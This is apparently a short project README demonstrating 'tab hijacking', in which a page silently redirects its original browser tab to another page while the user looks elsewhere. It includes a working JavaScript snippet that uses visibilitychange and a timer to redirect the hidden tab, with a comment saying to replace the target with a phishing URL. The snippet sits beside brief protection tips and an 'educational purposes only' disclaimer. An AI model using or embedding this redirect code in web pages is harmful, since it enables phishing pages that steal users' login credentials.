## 👨🏻‍💻️ Tab-H1j4ck

This educational project shows how **Tab H1j@cking** works — a trick where attackers hijack the **original tab** after a user opens a **new one**. It silently redirects the original tab to a different page (e.g., a fake login screen or misleading content) while the user is distracted.

---

### 🛡️ How to Protect Yourself

- ✅ Don’t trust tabs that open automatically  
- ✅ Always check the URL before logging in  

---

**🌐 Free Hosting & Subdomain**

> https://youtu.be/TV8CI3w6PlE

---

### 🔁 Example JavaScript Code

You can test it in y0ur 0wn pr0ject:

```js
let redirectTimer = null;

document.addEventListener('visibilitychange', function () {
  if (document.hidden) {
    console.log("⏳ Tab.");
    redirectTimer = setTimeout(() => {
      window.location.href = 'https://youtu.be/vE9O36mxQ2A'; // Replace with phishing URL
    }, 1500); // Redirects after 1.5s
  } else {
    console.log("🛑 Tab is active.");
    clearTimeout(redirectTimer);
  }
});
```

---

**🎥 Educational Demo**

> https://youtube.com/shorts/fQO1w-J7Wbo

---

> **⚠️ Warning:** This project is for **educational purposes only**. Never use it for malicious activities. Always obtain **explicit consent** before conducting any security tests.
